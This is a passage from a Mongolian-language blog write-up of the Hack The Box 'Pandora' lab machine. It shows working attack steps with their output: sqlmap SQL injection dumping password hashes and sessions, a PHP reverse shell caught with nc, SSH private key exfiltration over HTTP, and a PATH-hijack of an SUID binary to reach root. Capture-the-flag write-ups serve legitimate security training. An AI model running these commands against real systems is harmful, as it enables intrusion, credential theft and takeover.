</span></span></code></pre></div><h3 id=4-exploitation>4. Exploitation<a hidden class=anchor aria-hidden=true href=#4-exploitation>#</a></h3><p>Hosts</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
</span></span><span style=display:flex><span>127.0.1.1 pandora
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># The following lines are desirable for IPv6 capable hosts</span>
</span></span><span style=display:flex><span>::1     ip6-localhost ip6-loopback
</span></span><span style=display:flex><span>fe00::0 ip6-localnet
</span></span><span style=display:flex><span>ff00::0 ip6-mcastprefix
</span></span><span style=display:flex><span>ff02::1 ip6-allnodes
</span></span><span style=display:flex><span>ff02::2 ip6-allrouters
</span></span></code></pre></div><p>curl</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl localhost.localdomain/pandora_console/
</span></span></code></pre></div><h4 id=41-port-forwarding>4.1 Port forwarding<a hidden class=anchor aria-hidden=true href=#41-port-forwarding>#</a></h4><p>port forwarding from vm machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -D <span style=color:#ae81ff>9090</span> daniel@10.10.11.136
</span></span><span style=display:flex><span><span style=color:#75715e>#or</span>
</span></span><span style=display:flex><span>ssh -i 80:localhost:80 daniel@panda.htb
</span></span></code></pre></div><figure><img loading=lazy src=/images/pandora_post_image_2.png></figure><p>local vm -s <code>localhost.localdomain/pandora_console/</code> хандана.</p><p>proxychains</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo vi /etc/proxychains.conf
</span></span><span style=display:flex><span><span style=color:#75715e>#add</span>
</span></span><span style=display:flex><span>socks5 127.0.0.1 <span style=color:#ae81ff>9090</span> daniel HotelBabylon23
</span></span><span style=display:flex><span><span style=color:#75715e>#sqlmap</span>
</span></span><span style=display:flex><span>sudo proxychains sqlmap --url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://localhost/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&#34;</span> -D pandora --tables
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo proxychains sqlmap --url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://localhost/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&#34;</span> -D pandora -T tpassword_history --dump
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Database: pandora
</span></span><span style=display:flex><span>Table: tpassword_history
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> entries<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>+---------+---------+---------------------+----------------------------------+---------------------+
</span></span><span style=display:flex><span>| id_pass | id_user | date_end            | password                         | date_begin          |
</span></span><span style=display:flex><span>+---------+---------+---------------------+----------------------------------+---------------------+
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>1</span>       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
</span></span><span style=display:flex><span>| <span style=color:#ae81ff>2</span>       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
</span></span><span style=display:flex><span>+---------+---------+---------------------+----------------------------------+---------------------+
</span></span></code></pre></div><p>Session history:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo proxychains sqlmap --url<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://localhost/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&#34;</span> -D pandora -T tsessions_php --dump
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>| sdhjq94o4rhh2ae583881rk749 | id_usuario|s:5:<span style=color:#e6db74>&#34;admin&#34;</span>;alert_msg|a:0:<span style=color:#f92672>{}</span>new_chat|b:0; | <span style=color:#ae81ff>1645407015</span>  |
</span></span></code></pre></div><p>энэ cookie session болохгүй байсан&mldr;</p><h4 id=42-cve-2021-32099>4.2 CVE-2021-32099<a hidden class=anchor aria-hidden=true href=#42-cve-2021-32099>#</a></h4><p><a href=https://github.com/ibnuuby/CVE-2021-32099>https://github.com/ibnuuby/CVE-2021-32099</a></p><figure><img loading=lazy src=/images/pandora_post_image_3.png></figure><p>admin tool -> file manager цэсээр ороод php reverse shell хуулна.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span><span style=color:#75715e># http://localhost/pandora_console/images/php_rev.php</span>
</span></span><span style=display:flex><span><span style=color:#75715e># хандаад shell руу орно.</span>
</span></span></code></pre></div><h4 id=43-shell-balance>4.3 Shell balance<a hidden class=anchor aria-hidden=true href=#43-shell-balance>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></div><p><code>ctrl+z</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>stty raw -echo
</span></span></code></pre></div><p><code>f+g [enter enter]</code>
буцаад nc орлоо</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
</span></span></code></pre></div><p>user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>b56461f05*****
</span></span></code></pre></div><h3 id=5-enumeration>5. Enumeration<a hidden class=anchor aria-hidden=true href=#5-enumeration>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo -l
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span>sudo: PERM_ROOT: setresuid<span style=color:#f92672>(</span>0, -1, -1<span style=color:#f92672>)</span>: Operation not permitted
</span></span><span style=display:flex><span>sudo: unable to initialize policy plugin
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -user root -perm -4000 -exec ls -ldb <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> &gt;/tmp/suidfiles
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>matt@pandora:/tmp$ ls
</span></span><span style=display:flex><span>suidfiles
</span></span><span style=display:flex><span>matt@pandora:/tmp$ cat suidfiles 
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>166056</span> Jan <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>31032</span> May <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2021</span> /usr/bin/pkexec
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>85064</span> Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44784</span> Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>88464</span> Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>39144</span> Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/umount
</span></span><span style=display:flex><span>-rwsr-x--- <span style=color:#ae81ff>1</span> root matt <span style=color:#ae81ff>16816</span> Dec  <span style=color:#ae81ff>3</span> 15:58 /usr/bin/pandora_backup
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>68208</span> Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>55528</span> Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/mount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>67816</span> Jul <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2020</span> /usr/bin/su
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>39144</span> Mar  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2020</span> /usr/bin/fusermount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>53040</span> Jul <span style=color:#ae81ff>14</span>  <span style=color:#ae81ff>2021</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>473576</span> Jul <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2021</span> /usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>51344</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>14488</span> Jul  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2019</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22840</span> May <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2021</span> /usr/lib/policykit-1/polkit-agent-helper-1
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora!07P@C<span style=color:#f92672>=</span>jpv<span style=color:#f92672>=</span>D<span style=color:#e6db74>&#34;=== @ailed!
</span></span></span></code></pre></div><p>ssh</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh-keygen -t rsa
</span></span><span style=display:flex><span><span style=color:#75715e># history </span>
</span></span><span style=display:flex><span>matt@pandora:/home/matt$ ssh-keygen -t rsa
</span></span><span style=display:flex><span>Generating public/private rsa key pair.
</span></span><span style=display:flex><span>Enter file in which to save the key <span style=color:#f92672>(</span>/home/matt/.ssh/id_rsa<span style=color:#f92672>)</span>: 
</span></span><span style=display:flex><span>Created directory <span style=color:#e6db74>&#39;/home/matt/.ssh&#39;</span>.
</span></span><span style=display:flex><span>Enter passphrase <span style=color:#f92672>(</span>empty <span style=color:#66d9ef>for</span> no passphrase<span style=color:#f92672>)</span>: 
</span></span><span style=display:flex><span>Enter same passphrase again: 
</span></span><span style=display:flex><span>Your identification has been saved in /home/matt/.ssh/id_rsa
</span></span><span style=display:flex><span>Your public key has been saved in /home/matt/.ssh/id_rsa.pub
</span></span><span style=display:flex><span>The key fingerprint is:
</span></span><span style=display:flex><span>SHA256:9zHdIiJsSlQFOaC9aL2Ps3CVHT4hS2hIfWnb0yS0zoo matt@pandora
</span></span><span style=display:flex><span>The key<span style=color:#960050;background-color:#1e0010>&#39;</span>s randomart image is:
</span></span><span style=display:flex><span>+---<span style=color:#f92672>[</span>RSA 3072<span style=color:#f92672>]</span>----+
</span></span><span style=display:flex><span>|    ....o*o      |
</span></span><span style=display:flex><span>|   . +.o* ...    |
</span></span><span style=display:flex><span>|    o <span style=color:#f92672>=</span>oo+++     |
</span></span><span style=display:flex><span>|     <span style=color:#f92672>=</span> +.Ooo.. . |
</span></span><span style=display:flex><span>|    o + S O.+ o .|
</span></span><span style=display:flex><span>|   . . * + + + . |
</span></span><span style=display:flex><span>|    . E .   .    |
</span></span><span style=display:flex><span>|     o.o         |
</span></span><span style=display:flex><span>|      oo.        |
</span></span><span style=display:flex><span>+----<span style=color:#f92672>[</span>SHA256<span style=color:#f92672>]</span>-----+
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cd .ssh
</span></span><span style=display:flex><span>cat id_rsa.pub &gt; authorized_keys
</span></span><span style=display:flex><span><span style=color:#75715e># history</span>
</span></span><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ ls
</span></span><span style=display:flex><span>id_rsa  id_rsa.pub
</span></span><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys
</span></span><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ ls
</span></span><span style=display:flex><span>authorized_keys  id_rsa  id_rsa.pub
</span></span><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ cat authorized_keys 
</span></span><span style=display:flex><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMWVpzp5*******************k<span style=color:#f92672>=</span> matt@pandora
</span></span><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>700</span> .ssh
</span></span><span style=display:flex><span>cd .ssh
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> authorized_keys
</span></span></code></pre></div><p>Local vm руу id_rsa хуулна.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>matt@pandora:/home/matt/.ssh$ python3 -m http.server <span style=color:#ae81ff>9001</span>
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>9001</span> <span style=color:#f92672>(</span>http://0.0.0.0:9001/<span style=color:#f92672>)</span> ...
</span></span><span style=display:flex><span>10.10.14.6 - - <span style=color:#f92672>[</span>22/Feb/2022 06:28:54<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /id_rsa HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> -
</span></span><span style=display:flex><span>10.10.14.6 - - <span style=color:#f92672>[</span>22/Feb/2022 06:29:09<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /id_rsa HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> -
</span></span><span style=display:flex><span><span style=color:#75715e># Local VM</span>
</span></span><span style=display:flex><span>└──╼ $curl 10.10.11.136:9001/id_rsa -o id_rsa
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>2602</span>  <span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>2602</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>5172</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:--  <span style=color:#ae81ff>5235</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># chmod</span>
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>ssh -i id_rsa matt@10.10.11.136
</span></span></code></pre></div><p>matt ssh:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;/bin/bash&#34;</span> &gt; tar
</span></span><span style=display:flex><span>chmod +x tar
</span></span><span style=display:flex><span>export PATH<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>:$PATH
</span></span><span style=display:flex><span>/usr/bin/pandora_backup
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>PandoraFMS Backup Utility
</span></span><span style=display:flex><span>Now attempting to backup PandoraFMS client
</span></span></code></pre></div><p>root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>9087141********
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://cadil.github.io/posts/2024-03-05-htb-backdoor-writeup/><span class=title>« Ѳмнѳх</span><br><span>HTB - Backdoor</span>
</a><a class=next href=https://cadil.github.io/posts/2024-03-02-htb-secret-writeup/><span class=title>Дараах »</span><br><span>HTB - Secret</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>